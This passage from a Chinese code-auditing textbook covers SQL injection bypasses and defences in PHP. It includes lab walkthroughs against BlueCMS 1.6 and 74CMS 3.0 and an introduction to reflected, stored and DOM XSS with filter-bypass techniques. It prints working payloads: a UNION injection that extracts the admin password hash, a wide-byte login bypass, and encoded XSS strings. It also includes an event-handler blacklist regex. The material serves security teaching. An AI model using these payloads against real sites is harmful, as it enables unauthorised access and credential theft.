![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image186.jpg)

图3-8 数据库执行监控图

### 3.3.3  字符串替换绕过

在执行SQL语句前，程序对字符串的某些字符进行替换，替换的字符包括反斜线（\）、单引号（’），从而绕过addslashes函数。

（1）  Base64解码绕过代码：



<?php

$link = mysql_connect('localhost', 'root', 'root') or die('bad!');

mysql_query("SET NANES 'gbk'");

mysql_select_db("test",$link);

$username=$_REQUEST['username'];

**$username=addslashes($username);**

**//将用户名中字符\\、/、空格替换为空字符**

**$username=str_replace(array("\\","/"," "),array("","",""),$username);**

$password=md5($_REQUEST ['password']);

**$sql="select count(\*) as num from admin where name='".$username."' and pass='".$password.".";**

$query=mysql_query($sql);

$res=mysql_fetch_array($query);

$count=$res['num'];

if($count==1){echo "login success";}else{echo "login failed";}?>



（2）  利用方法：

预拼凑的SQL语句为“select count(*) as num from admin where name=’admin’# ' and pass='$password’”。假设的$username参数值为admin’#。经过addslashes过滤后该参数值从“admin’#”转化为“admin/’#”。str_replace函数将\、/、空格替换为空字符，因此替换后结果为“admin’#”，可拼凑出SQL语句注入成功。

发送的HTTP请求路径为“192.168.0.10/ /index4.php?username=admin%27%20%23&password=test”，测试结果如图3-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image188.jpg)

图3-9 字符串替换测试图

## 3.4 SQL注入防御

对于SQL注入漏洞防御，分为：代码层防御、配置层防御、物理层。

1、代码层防御

（1）  PHP通用过滤函数

PHP内置了一些过滤函数可有效方式SQL注入漏洞，有些函数在上文已经提到过，但未进行详细介绍。下面介绍常用内置过滤函数mysql_[real_]escape_string 、intval、addslashes。

l addslashes函数

该函数的过滤效果与GPC相同，过滤的预定义字符包括：单引号、双引号、反斜杠、NULL。大多数程序函数入口都使用该函数进行过滤。但是该函数依旧只能转移字符型数据，对数字型数据无法进行过滤。

下面给出addslashes案例代码：



<?php 

$username="'\"\\";

echo "unfilte : ".$username."</br>";

**$username=addslashes($username);**

echo "filted : ".$username;

?>



执行结果：

unfilte : **'"\**

filted : **\'\"\\**

l Intval函数

常见的数字型SQL注入可使用报错注入或盲注的方式来进行绕过。而为了防御这类注入，intval等函数可以起到重要的作用。Intval的作用是将变量转换为int类型。下面给出Intval案例代码：



<?php 

$id="1 union select xxx";

echo "unfilte : ".$id."</br>";

**$id=intval($id);**

echo "filted : ".$id;

?>



执行结果：

unfilte : **1 union select xxx**

filted : **1**

l Mysql_[real_]escape_string函数

Mysql_escape_string和mysql_real_escape_string函数将对特殊字符串进行过滤，特殊字符串包括：[\x00][\n][\r][\][‘][“][\x1a]，两个函数唯一不同的是mysql_real_escape_string函数接收的是一个连接句柄并根据当前字符集转义字符串。由于该函数可防御的特殊字符有限，该函数同样无法防御无单引号保护的数字型SQL注入。下面给出使用案例：



<?php

$con = mysql_connect("localhost","root","123456");

$id = mysql_real_escape_string($_GET['id'],$con);

$sql = "select * from test where id ='".$id."'";

echo $sql;

?>



  当请求该文件?id=1’时，参数通过mysql_real_escape_string过滤后，拼接的SQL语句将输出为select * from test where id=’1\"。

（2）  PDO预编译防御

使用PDO进行预编译可以使用PDO方式对SQL语句进行预编译，从而在执行代码阶段SQL语句无法发生变化，理论上可以阻挡任何SQL注入攻击。

PDO是（PHP Data Objects）是在PHP5.1版本之后开始支持的。PDO可以被看作是php提供的一个类，它提供了一组数据库抽象层API，使得编写PHP代码不再关心具体要连接的数据库类型。使用PDO既可以连接mysql也可以用它连接oracle。并且PDO很好的解决了SQL注入问题。

图3-10给出PDO预编译及执行SQL的过程：

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image190.jpg)

图3-10 PDO预编译执行过程图

PDO不会在本地对SQL进行拼接然后将拼接后的SQL传递给mysql 服务器处理（即不会在本地做转义处理）。

l PDO的处理方法是在预处理函数prepare调用时，将预处理好的SQL模板（包含占位符）通过mysql协议传递给mysql服务器。预留的值使用参数“?”标记，例如：insert into test(name,passwd) values(?,?)。

l 当调用执行函数execute时，将两个参数传递给mysql服务器。由mysql服务器完成变量的转移处理，将应用绑定的值传递给参数，执行SQL语句。将SQL模板和变量分两次传递，即解决了SQL注入问题。

使用PDO预编译的优点如下：

l 预编译语句大大减少了分析时间，只做了一次查询。

l 绑定参数减少了服务器带宽，只需要发送查询的参数，而不是整个语句编译过程已经确定SQL执行语句，理论上可以阻挡任何SQL注入。

（3）  宽字节注入防御

一般来说宽字节注入防御方法包括：

l 在所有的SQL语句前指定连接的形式设置为Binary二进制，使用character_set_client设置二进制。该方法经常使用，例如：

mysql_query("SET character_set_connection=gbk, character_set_results=gbk,**character_set_client=binary**", $conn);

l 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。虽然该方法可行，但很多网站依旧使用addslashes()函数进行过滤，在PHP7.0后移除。

l 设置SQL连接为UTF-8编码。Mysqli_query(link,’SET NAMES UTF-8’)。

2、 配置层防御

（1）魔术引号防御

此防御机制在书“1.4影响代码审计的配置”介绍，通过配置将单引号、双引号、反斜杠及空字符NULL进行转义。下面给出魔术引号配置选项：

l Magic_quotes_gpc：对GET、POST、Cookie等参数的值进行过滤，可有效防御字符型注入漏洞；

l Magic_quotes_runtime：对数据库或文件中获取的数据进行过滤，可有效防御FILE注入漏洞（FILE注入是文件上传时将文件名存入到数据库中，而攻击者可通过修改文件名完成SQL注入漏洞的情况）。``

通过开启上述配置可一定程度上防止HTTP传递参数注入及文件名注入等漏洞。但是该配置无法防止数字型注入类型漏洞。

3、物理层防御

为网络设备加装WAF、云防护、IPS等系统，防御SQL注入漏洞。

## 3.5 SQL注入CMS实践

### 3.5.1  实验：BlueCMS1.6 Union注入

· 实验介绍

对BlueCMS1.6进行代码审计工作，审计该CMS中的SQL注入漏洞。该CMS1.6版本自发布以来存在很多漏洞，本实验以ad_js.php文件的Union注入为案例进行分析。

· 预备知识

参考3.2.1节：无过滤参数注入。

· 实验目的

掌握数字型SQL注入的审计方法。

· 实验环境

Windows操作系统主机；BlueCMS1.6安装包；PhpStorm工具；Seay代码审计工具。

· 实验步骤

（1）  审计阶段

l 对BlueCMS全局过滤进行了解。

对/uploads/include/common.inc.php文件进行审计，首先使用require_once函数包含通用函数，然后判断gpc开启情况，若未开启gpc则调用deep_addslashes函数进行过滤，如图3-11所示。

deep_addslashes函数会判断$str是否为数组，如果是数组则递归调用deep_addslashes函数，直至为字符串再调用addslashes函数进行过滤。如果是字符串则直接使用addslashes进行过滤。至此，基本了解了该CMS中的全局过滤功能，即以POST、GET、COOKIE、REQUEST方式传递的参数将被addslashes函数过滤。该函数代码如图3-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image192.gif)

图3-11 common.inc.php代码图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image194.gif)

图3-12 deep_addslashes函数图

l 定位漏洞

全局搜索GET方式传递的数字型SQL注入，查看参数是否被intval函数进行防御过滤。（PhpStorm快捷键为CTRL+SHIFT+F），也可使用Seay代码审计工具直接自动扫描审计结果，从而加快检索速度，PhpStorm全局搜索结果如图3-13所示，漏洞定位至ad_js.php文件。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image196.jpg)

图3-13 全局搜索$_GET图

ad_js.php文件代码如图3-14所示，对参数ad_id进行数据流分析。首先判断ad_id是否为空，如果为空则报错。如果不为空则使用trim函数进行过滤（trim函数是移除字符串两侧的空白字符或其他预定义字符），然后执行SQL语句select * from ad where ad_id = $ad_id。由于参数$ad_id只进行了trim过滤而未使用intval函数过滤，导致其存在SQL注入漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image198.jpg)

图3-14 ad_js.php参数传递图

（2）测试利用阶段

使用order by测试能否被注入，通过Seay审计工具监控数据库执行。测试payload为：http://192.168.0.11/blue/ad_js.php?ad_id=-1 order by 9#。数据库执行监控如图3-15所示，成功拼接SQL语句SELECT * FROM blue_ad WHERE ad_id =-1 order by 9。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image200.jpg)

图3-15 数据库执行监控图

该CMS的blue数据库中存在表blue_admin。该表中存储着该系统的管理员账户密码，构造SQL语句为：SELECT * FROM blue_ad WHERE ad_id =-1 union select 1,2,3,4,5,6,concat(admin_name,#,pwd) from blue_admin limit 0,1#。

测试payload为：http://192.168.0.11/blue/ad_js.php?ad_id=-1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%200,1#。

测试结果如图3-16所示，用户名为admin密码21232f297a57a5a743894a0e4a801fc3。很明显该密码被加密过，后台代码查看密码加密算法。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image202.jpg)

图3-16 前台代码测试结果图

admin/user.php文件的用户注册功能，程序将密码pasword进行md5加密，然后将用户信息存放至user表，如图3-17所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image204.jpg)

图3-17 user.php文件图

使用在线md5解密工具，解密后的结果为admin，如图3-18所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image206.jpg)

图3-18 md5解码图

### 3.5.2  实验：74CMS3.0 宽字节注入

· 实验介绍

本实验将对74CMS3.0进行代码审计工作，审计该CMS中的SQL注入漏洞。本次实验以admin_login.php文件中登录功能的宽字节注入为案例进行分析。

· 预备知识

参考3.5.1节：宽字节注入绕过。

· 实验目的

掌握数字型SQL中宽字节注入绕过addslashes的审计方法。

· 实验环境

Windows操作系统主机；74CMS3.0安装包；PhpStorm工具；Seay代码审计工具。

· 实验步骤

（1）  审计阶段

l 对74CMS3.0全局过滤进行了解。

全局配置文件admin_common_inc.php中查看全局过滤函数实现。首先判断gpc开启情况，若为开启GCP则调用admin_addslashes_deep函数过滤请求传参数据，如图3-19所示。

查看admin_addslashes_deep函数，首先判断$value变量是否为空，如果不为空则判断$value是否为数组，递归调用admin_addslashes_deep函数，直至传递参数$value都通过addslashes函数过滤，如图3-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image208.jpg)

图3-19 admin_common_inc.php代码图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image210.jpg)

图3-20 admin_addslashes_deep函数图

以管理员登录功能为案例，测试管理员登录页面对普通注入漏洞的addslashes防御效果。使用Seay数据监控工具模块进行模糊测试SQL注入情况。当用户名输入admin’ or 1=1 #后，密码随意输入，点击登录。SQL执行情况如图3-21所示，图中单引号’被成功转移为\’。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image212.jpg)

图3-21 MySQL执行监控图

l 定位漏洞

```
宽字节注入可以绕过addslashes函数防御，该漏洞条件是数据库连接采用GBK编码，因此对该CMS编码情况进行分析。通过全局搜索函数包括：mysql_set_charset、mysql_query关键字，在文件mysql.class.php中数据库连接采用GBK编码，如图3-22所示，该CMS存在宽字节注入漏洞。

图3-22 数据库设置GBK编码图
```

对于该CMS管理员登录功能而言，其逻辑代码文件为admin_login.php，需要对该文件进行审计了解程序执行流程。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image216.jpg)

图3-23 admin_login.php文件图

如图3-23所示，程序首先定义常量“IN_QISHI”为“true”并包含config.php和admin_common.inc.php文件。config.php文件用于数据库配置，admin_common.inc.php文件用于连接数据库并过滤GET、POST、COOKIE、REQUEST的传递数据。

然后，通过$_REQUEST[‘act’]获取HTTP请求传递数据并赋值给变量$act。对$act内容进行判断，若登录参数为do_login，则进行登录判断。调用check_word函数检查验证码的正确性，随后调用check_admin函数检查用户名密码，如果用户名密码正确就更新管理员信息，并为用户设置Cookie信息。其中比较重要的是check_admin函数，只有该函数通过才能“成功登录”。

check_admin代码如图3-24所示，调用get_admin_one函数执行SQL语句查询用户名是否存在，然后对密码进行md5加密操作。通过用户名$name和加密后密码$md5_pwd执行SQL语句查询用户是否存在。该SQL语句通过单引号保护为字符型SQL注入，同时参数$name使用addslashes过滤。但由于数据库连接使用GBK编码，因此存在宽字节注入漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image218.jpg)

图3-24 check_admin代码图

（2）测试利用阶段

登录界面为POST方法传递参数，使用BurpSuit进行数据包拦截，页面如图3-25所示。

![图片7](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image220.gif)

图3-25 登录页面图

在admin_login.php页面上输入用户名admin和任意密码，输入正确的验证码，BurpSuite拦截到数据包后，在admin_name字段的末尾加上%df%27 or 1=1%23，再点击Forward按钮，使用宽字节SQL注入的方式形成万能密码登录。修改BurpSuite拦截数据的数据包如图3-26所示。

将连接数据包全部转发后，查看页面显示情况，发现已经成功登录CMS后台管理员系统，如图3-27所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image222.jpg)

图3-26 登录数据包拦截图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image224.jpg)

图3-27 登录成功图

## 3.6 单元小结

本单元主要学习代码审计中的SQL注入漏洞。通过对SQL注入漏洞介绍，使读者熟悉审计SQL注入漏洞的方式及方法。需着重掌握各类SQL注入漏洞的PHP代码形式、漏洞原理、利用方法、审计方法、防御方法等，同时能够使用Seay工具对CMS中的SQL执行进行模糊测试。



 

# 单元4 XSS漏洞审计

本单元介绍了代码审计中XSS漏洞，其主要分为四个部分进行介绍。

第一部分主要介绍XSS漏洞的基础知识，包括：XSS漏洞简介、XSS漏洞的挖掘经验。

第二部分介绍XSS漏洞的分类，包括：反射型XSS漏洞、存储型XSS漏洞、DOM型XSS漏洞的概念及代码案例。

第三部分介绍XSS漏洞的常见防御机制，以及常见的绕过XSS漏洞的方法，包括：编解码绕过、HTML编写不规范、黑名单绕过、宽字节注入。

第四部分使用BlueCMS及74CMS为实验，通过代码审计XSS漏洞挖掘该CMS中的安全漏洞。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image226.jpg)

**单元目标：**

\1. 熟悉XSS漏洞的概念及分类；

\2. 了解XSS漏洞的挖掘技巧；

\3. 掌握XSS漏洞的常见代码审计方法；

\4. 掌握XSS漏洞的防御方法。

## 4.1 XSS漏洞挖掘

### 4.1.1 XSS漏洞简介

XSS（Cross-Site Scripting）漏洞是Web应用程序中最常见的漏洞之一，其名为跨站脚本攻击。该漏洞出现的主要原因是网站设计程序对用户输入内容过滤存在缺陷，导致网站页面篡改或脚本植入。攻击者向Web应用中嵌入提前设计好的恶意JavaScript（JS）脚本，使得其他用户在浏览该网站程序时浏览器自动执行了恶意的JS脚本并受到攻击。

XSS漏洞攻击方式按照对象分为两类：针对用户、针对Web服务器。对于用户来说常见的有：获得用户的信息（会话和Cookie等各种身份内容），为其他用户的客户端植入木马、广告刷流量、网络钓鱼。对于Web服务器来说常见的有：获得服务器更高的执行权限、篡改页面、传播蠕虫等，图4-1为XSS的攻击方式。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image228.jpg)

图4-1 XSS攻击方式

在实际的应用场景中，XSS漏洞可以说是无孔不入，网站程序设计者的一个小疏忽就将引起XSS漏洞。该漏洞往往出现在用户输入位置，例如：网站评论区、留言板、搜索框等。

### 4.1.2 XSS漏洞挖掘经验

在代码审计过程中，相比SQL注入漏洞而言，XSS漏洞要更加难以防御。该漏洞与浏览器环境关系很大，其需要了解浏览器的容错性、编码、数据协议等知识。但是XSS漏洞的审计还是有一定规律可循的，可以说所有用户可控且能输出到页面的代码中都有可能存在XSS漏洞，包括：URL中的参数、HTML的表单等。下面将介绍XSS漏洞审计的常见思路。

（1）  根据功能点分析传参数据流

按功能进行审计，XSS漏洞可能出现的业务场景包括：评论区、留言区、个人信息、订单信息、搜索框、图片属性等。

其需要考虑的内容如下：

  审计代码中敏感功能点传参从前台代码到后台再到回显的业务代码流程。

  审计全局过滤函数实现方法。

  审计前台JS及后台PHP代码对参数的过滤情况。

  审计数据库对可控字段的长度限制情况（针对于存储型XSS）。

  审计数据从后台显示到前台页面过程的过滤情况。

（2）  根据后台PHP接收请求参数分析

PHP中常见接收参数方式包括：$_GET、$_POST、$_REQUEST等。通过关键字搜索接收参数代码，若程序将参数值显示到前台页面，且未对参数进行HTML编码过滤，则存在XSS漏洞。

（3）  根据输出函数分析

全局搜索后台代码中的常见输出函数：print、print_r、echo、printf、sprintf、die、var_dump、var_export等，查看这些函数打印情况及是否参数存在过滤情况。DOM型XSS则需要全局搜索JS操作DOM元素的关键字，例如：getElementById(id)、appendChild(node)、removeChild(node)、innerHTML、parentNode、childNodes、attributes等。

## 4.2 XSS漏洞分类

根据恶意用户使用的XSS漏洞攻击载荷的存储位置进行区分，将XSS漏洞分为三种类型，分别是：反射型XSS漏洞、存储型XSS漏洞和DOM型XSS漏洞。

### 4.2.1 反射型XSS漏洞

反射型XSS漏洞又名为非持久型XSS漏洞，该漏洞出现的原因主要是对用户通过URL形式传递的参数未进行安全过滤就在浏览器进行解析输出，从而使得用户浏览器在输出正常数据的同时，还执行了恶意代码程序。

（1）  无过滤反射型XSS代码案例：



<?php 

ini_set("display_errors", 0);

$str = $_GET["name"];

echo "<h2 align=center>欢迎用户".$str."</h2>";

?>



（2）  分析漏洞：

使用HTTP的GET方式传递参数name，且该参数未进行过滤。可通过name变量放入XSS脚本，当脚本显示到HTML时，浏览器响应并执行XSS脚本。

（3）  利用方法：

  构造的Payload如下：



http://192.168.0.11/level.php?name=<script>alert(“xss”)</script>



测试结果如图4-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image230.jpg)

图4-2 反射型XSS攻击测试图

### 4.2.3 存储型XSS漏洞

存储型XSS漏洞又名为持久型XSS漏洞，该漏洞出现的原因是对用户输入信息数据未进行安全过滤，从而使得用户输入的恶意脚本保存到了服务器的数据库或文件中。当用户访问网站特定网页时，由于网页调用数据库中的信息并展示，从而触发了被保存的恶意脚本。该漏洞只要用户访问了被攻击的网页，就会触发攻击效果。

（1）  无过滤存储型XSS的审计代码案例如下：



<?php

if( isset( $_POST[ **'btnSign'** ] ) ) {

  $message = trim( $_POST[ **'mtxMessage'** ] );//对参数mtxMessage首尾去空格

  $name = trim( $_POST[ **'txtName'** ] ); //对参数txtName首尾去空格

  $message = stripslashes( $message );//删除变量$message中的反斜杠\

  $message = mysql_real_escape_string( $message );// 对变量$message进行过滤防御SQL注入漏洞

  $name = mysql_real_escape_string( $name ); // 对变量$ name进行过滤防御SQL注入漏洞

  **$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";//SQL****语句，向数据库guestbook中插入数据**

  **$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );**}?>//执行插入数据的SQL语句或打印数据库错误



前台显示页面函数代码如下：



function dvwaGuestbook() {

  $query = "SELECT name, comment FROM guestbook";//查询guestbook数据库数据SQL语句

  $result = mysql_query( $query );//执行查询数据SQL语句

  $guestbook = '';

  while( $row = mysql_fetch_row( $result ) ) {

​    **$name  = $row[0];**

​    **$comment = $row[1];**

​    **$guestbook .= "<div id=\"guestbook_comments\">Name: {$name}<br />" . "Message: {$comment}<br /></div>\n";//将数据库数据逐条显示到前台页面**

  }return $guestbook;}



（2）  分析漏洞：

上述代码使用HTTP的POST方式传递参数btnSign、mtxMessage、txtName。mtxMessage参数使用的过滤函数包括：trim、stripslashes、mysql_real_escape_string。txtName参数使用的过滤函数包括：trim、mysql_real_escape_string。

l trim(string,charlist)：移除string字符两侧的预定义字符，预定义字符包括：\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符。

l stripslashes(string)：去除掉string字符的反斜杠＼。

l mysqli_real_escape_string(string,connection)：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。

上述函数无法防御XSS的Payload：<script>alert(1)</script>，因此可以通过参数mtxMessage和txtName存储恶意脚本到guestbook数据库中。当触发前台页面时，恶意JS脚本将被加载并通过页面执行。

（3）  利用方法：

  传递参数mtxMessage或txtName的恶意脚本为<script>alert(1)</script>。

### 4.2.5 DOM型XSS漏洞

DOM型XSS漏洞主要是利用了JavaScript的Document Object Model（简称DOM）节点编程，它可以改变HTML代码的特性而形成XSS攻击。不同于之前介绍的存储型XSS漏洞，DOM XSS是通过URL参数去控制触发的，因此它也属于反射型XSS。

下面介绍HTML DOM常见属性与方法，这些方法传递的参数都可能出现DOM型XSS漏洞。

一些常用的 HTML DOM 方法：

·  getElementById(id)：获取带有指定 id 的节点（元素）；

·  appendChild(node)：插入新的子节点（元素）；

·  removeChild(node)：删除子节点（元素）。

一些常用的 HTML DOM 属性：

·  innerHTML：节点（元素）的文本值；

·  parentNode：节点（元素）的父节点；

·  childNodes：节点（元素）的子节点；

·  attributes：节点（元素）的属性节点。

该类型攻击需要攻击者对具体的JS DOM代码进行分析，并根据实际情况进行XSS漏洞利用。由于DOM XSS攻击载荷构造难度较大且该漏洞利用方式苛刻，使得该漏洞应用不广泛。

（1）  无过滤DOM型XSS的审计代码案例如下：



<html>

<head><title>DOM XSS</title><meta charset="utf-8"></head>

<body>

   <div id="domarea"></div>                          //domarea元素

  <FORM action="" method="post">

​    <input type="text" id="dom" value="输入">  //dom元素

​    <input type="button" value="替换" onclick="domfuc()">

  </FORM>

</body>

<script>

function domfuc(){

**document.getElementById("domarea").innerHTML = document.getElementById("dom").value;** }

//将domarea元素的值替换为dom元素的值

</script>

</html>



（2）  分析漏洞：

该代码由HTML中的FORM表单与JS函数domfuc组成，当输入内容点击“替换”后，开始触发调用domfuc函数，而该函数的内容是“document.getElementById("domarea").innerHTML = document.getElementById("dom").value;”将HTML中的domarea节点修改为dom节点值，而dom节点的值为FORM表单中的输入内容，由于对用户输入内容过滤不严格，使得恶意代码被执行，该输入内容改变了HTML中的节点。

（3）  利用方法：

  该输入框存在DOM型XSS漏洞，当输入内容“<img src=x onerror='alert(/hacker/)'>”，单击“替换”按钮，页面弹出消息框，如图4-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image232.gif)

图4-3 DOM型XSS测试图

## 4.3 XSS漏洞绕过

  为了防御XSS漏洞的攻击，很多CMS在开发时将使用各种方法，例如：函数htmlspecialchars、黑白名单、正则表达式等。但是由于XSS漏洞的攻击方式过于多样，也存在很多绕过的情况。本小节将介绍四种常见的绕过情况，包括：编解码绕过、HTML编写不规范绕过、黑名单绕过、宽字节注入XSS。

### 4.3.1 编解码绕过

在代码审计过程，由于由页面与实际环境的多样性，导致XSS漏洞很难有效的防御。随着浏览器及具体场景不同，很多XSS Payload都可根据具体场景，通过使用不同编码绕过htmlspecialchars保护函数（该保护函数具体含义详见4.4节）。

除此之外，程序开发过程中的编解码与防御函数调用逻辑不当，也可能导致绕过防御函数htmlspecialchars的情况。对于编码问题而言，常见的编码绕过情况有很多种类型，包括：URL编码、Unicode编码、Base64编码、Javascript伪协议等。

（1）  URL编码绕过

l 案例代码如下：



<?php

$a=urldecode($_GET['id']); //接收参数并进行url解码

$b=htmlspecialchars($a);  //HTML ENCODE处理,到这里都是没有问题的

echo urldecode($b);    //最后，url解码输出

?>



l 分析漏洞：

代码逻辑中，首先对传递参数进行URL解码，然后调用函数htmlspecialchars进行过滤，再调用urldecode函数对过滤参数进行URL解码。由于最后调用urldecode进行解码输出将导致存在三重URL编码绕过情况。

Payload原型为<script>alert(/xss/)</script>，经过三次URL编码后结果为：

id=%25253Cscript%25253Ealert(/xss/)%25253C/script%25253E

l 利用测试：

通过三次URL编码的Payload成功绕过htmlspecialchars防御，执行恶意脚本。在实际情况下，HTML ENCODE处理后直接输出变量，无需再次URL解码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image234.jpg)

图4-4 URL编码绕过测试图

l URL编码的Payload

<iframe src=”javascript:alert(1)”>test</iframe>

<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

<a href="javascript:%61%6c%65%72%74%28%31%29">xx</a>

（2）  Unicode编码绕过

在代码审计过程中，有些Web程序过滤了某些字符串，但是发现这个站点在后端验证字符串的时候，识别Unicode编码。那就可以把Payload来改成Unicode编码形式，就可以绕过站点过滤机制htmlspecialchars。

l 测试Payload：

```
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>
```

l 原理：

JS中eval函数可以将参数中字符串按照代码执行。String.fromCharCode可以将参数中的Unicode值转化为对应字符串：97,108,101,114,116,40,39,120,115,115,39,41通过Unicode解码为alert('xss')。

（3）  Base64编码绕过

在代码审计过程中，XSS漏洞还存在Base64编码绕过的情况，该情况大多数有两种类型，包括：<a href=”可控点”>和<iframe src=”可控点”>。

l a标签Payload

<a href=“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>test</a>

这样当链接被点击时，就会以data协议，页面以html/text的方式解析编码为base64 其中PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==经过Base64解码为<scirpt>alert(1)</script>

l iframe标签Payload

<iframe src=“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>

</iframe>其原理与a标签类似。

### 4.3.2 HTML编写不规范绕过

在代码开发过程中，由于HTML代码编写不规范（不使用双引号保护元素值），将导致Payload可绕过htmlspecialchars过滤函数。其主要原因是htmlspecialchars函数在默认情况下不能过滤单引号，很多XSS Payload可通过闭合HTML标签及通过事件标签触发执行恶意脚本。

l 案例代码如下：



<?php

   $name = **htmlspecialchars**($_GET['name']); ?>

<input type='text' class='search' value=**'<?=$name?>'**>



l 分析漏洞：

通过HTTP的GET方式获取参数，在一个input元素的属性里输出这个变量，且该标签内使用单引号闭合保护。但是htmlspecialchars函数默认只是转化双引号（”）, 不对单引号（’）做转义。因此，XSS 的payload可以用单引号闭合执行恶意脚本。

Payload为： http://ip/a.php?name=222' onclick='alert(/xxs/)

上述Payload经过htmlspecialchars过滤后无效，拼接后的input标签内容为<input type='text' class='search' value='222' onclick='alert(/xxs/)'>

l 利用测试：

构造无双引号等标签的事件触发类型Payload成功绕过htmlspecialchars防御，执行恶意脚本，如图4-5所示。针对这种情况的修复安全建议：将HTML标签的属性值用双引号保护，而不使用单引号保护。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image236.gif)

图4-5 绕过htmlspecailchars防御图

### 4.3.3 黑名单过滤绕过

在代码开发过程中，为了防御XSS攻击，很多程序通过在全局引入过滤函数，提供黑名单过滤XSS的Payload。

过滤方式包括两种：过滤常见标签；使用正则表达式过滤。

（1）  对于常见标签而言，由于XSS漏洞变化多样，常见标签过滤很难完全抵御XSS。

（2）  对于正则表达式而言，有很多CMS都存在由于正则表达式书写不严谨导致的XSS Payload绕过正则表达式。

l 绕过常见标签案例代码如下：



<?php

  $name = htmlspecialchars($_GET['name']);//对GET传递的值进行HTML实体转码

  $pregs = "**/<script>|<\/script>|onclick|oncontextmenu|ondblclick|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseover|onmouseout|onmouseup|onkeydown|onkeypress|onkeyup/i**";//定义黑名单关键字

  $check = preg_match($pregs, $name);//匹配关键字，返回true或false

  if ($check) {

​      echo 'not found';

​      exit;}?>

<input type='text' class='search' value='<?=$name?>'>



l 分析漏洞：

使用黑名单的方式可以在一定程度上增加XSS的防御性，但是这并不全面。上述代码中使用黑名单对常见的事件类型标签进行过滤。但是基于XSS的Payload事件标签至今有105个，使用黑名单明显不够严谨。

Payload：?name=111' onfocus='alert(/xss/)

上述Payload经过htmlspecialchars过滤后无效，拼接后的input标签内容为<input type='text' class='search' value='111' onfocus='alert(/xxs/)'>，测试结果如图4-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image238.gif)

图4-6 黑名单绕过测试图

最后给出常见的基于事件XSS标签，如表4-1所示。

表4-1 XSS标签图

| 标签         | 解释                                                     | 标签        | 解释                                   |
| ------------ | -------------------------------------------------------- | ----------- | -------------------------------------- |
| onAbort()    | 当用户中止加载图片时                                     | onError()   | 在加载文档或图像时发生错误             |
| onActivate() | 当对象激活时                                             | onFocus()   | 当窗口获得焦点时攻击者可以执行攻击代码 |
| onClick()    | 表单中点击触发                                           | onMessage() | 当页面收到一个信息时触发事件           |
| onCopy()     | 用户需要复制一些东西或使用execCommand("Copy")命令时触发) | onMove()    | 用户或攻击者移动页面时触发             |
| onDrop()     | 当拖动元素放置在目标区域时触发                           | onSeek()    | 当用户在元素上执行查找操作时触发       |

l 绕过常见标签案例代码如下：



```
//某CMS的前台JS代码过滤邮箱正则表达式
var pattern = /^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(.\D)+/;
```



l 分析漏洞：

正则表示式常用符号如表4-2所示。

表4-2 正则表达式符号表

| 符号     | 解释               | 符号     | 解释                     |
| -------- | ------------------ | -------- | ------------------------ |
| ^        | 正则表达式开头     | &        | 正则表达式结尾           |
| \d \w \s | 匹配数字 字符 空格 | \D \W \S | 匹配非数字 非字符 非空格 |
| [a-z]    | 匹配a到z的一个字母 | [^abc]   | 匹配除了abc的其他字母    |
| ?        | 0次或1次匹配       | +        | 匹配1次或多次            |
| {n}      | 匹配n次            | {n,}     | 匹配n次以上              |
| {m,n}    | 匹配最少m次最多n次 | .        | 除换行符以外所有字符     |

